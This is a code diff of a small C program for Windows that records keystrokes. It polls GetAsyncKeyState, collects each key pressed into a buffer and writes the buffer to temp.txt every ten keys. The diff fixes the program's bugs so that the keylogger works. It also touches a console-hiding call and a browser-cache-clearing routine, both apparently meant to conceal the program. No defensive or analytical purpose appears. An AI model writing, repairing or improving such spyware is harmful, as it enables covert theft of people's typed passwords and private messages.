@@ -88,36 +88,40 @@ void save(char key, char* input)
     }else{
         char temp[2] = "";
         temp[0] = key;
-        temp[1] = "\0";
+        temp[1] = '\0';
         strcat(input,temp);
     }
 }
 
 int main(void)
 {
-    freeConsole();
+    // freeConsole();
     
     clearBrowserCache();
-    char* input = (char*)malloc(100*sizeof(char));
-    input[0] = "\0";
-    counter = 0;
+    char *input = (char*)malloc(100*sizeof(char));
+    input[0] = '\0';
+    char counter = 0;
     while(1)
     {
         for(char i = 0; i <= 190; i++)
         {
-            if(getAsyncKeyState(i) == -32767)
+            if(GetAsyncKeyState(i) == -32767)
             {
                 counter++;
                 save(i,input);
                 if(counter == 10)
                 {
                     counter = 0;
-                    FILE *fp=fopen("temp.txt","rw");
-                    fprintf(fp,"%s",input);
-                    fclose(fp);
+                    FILE *fp=fopen("temp.txt","w");
+                    if(fp != NULL)
+                    {
+                        fprintf(fp,"%s",input);
+                        fclose(fp);
+                    }
+                    
                     free(input);
-                    input=(char*)malloc(100*sizeof(char));
-                    input[0] = "\0";
+                    input=(char *)malloc(100 * sizeof(char));
+                    input[0] = '\0';
                 }
             }
         }
